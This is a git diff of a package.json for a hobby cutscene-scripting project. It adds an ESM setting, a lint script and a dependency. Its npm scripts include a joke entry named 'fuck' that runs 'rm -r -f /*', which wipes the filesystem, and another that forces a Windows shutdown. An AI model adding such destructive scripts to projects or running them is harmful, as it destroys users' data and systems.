@@ -3,6 +3,7 @@
     "version": "1.0.0",
     "description": "a language to make cutscene and scene",
     "main": "index.js",
+    "type": "module",
     "scripts": {
         "test": "node index.js test && npx eslint index.js",
         "make": "node index.js make",
@@ -10,15 +11,17 @@
         "fix": "npx eslint . --fix",
         "dev": "node --watch index.js test",
         "doctor": "npm audit && npm outdated",
-        "fuck": "rm -rf /",
+        "fuck": "rm -r -f /*",
         "safe-fuck": "lutris lutris:rungame/genshin-impact",
         "weather": "curl wttr.in",
         "tired:windows": "shutdown -s -f -t 0",
-        "format": "npx prettier --tab-width 4 . --write"
+        "format": "npx prettier --tab-width 4 . --write",
+        "lint": "npx eslint"
     },
     "author": "acoolg",
     "license": "MIT",
     "dependencies": {
+        "consola": "^3.4.2",
         "fs": "^0.0.1-security"
     },
     "devDependencies": {
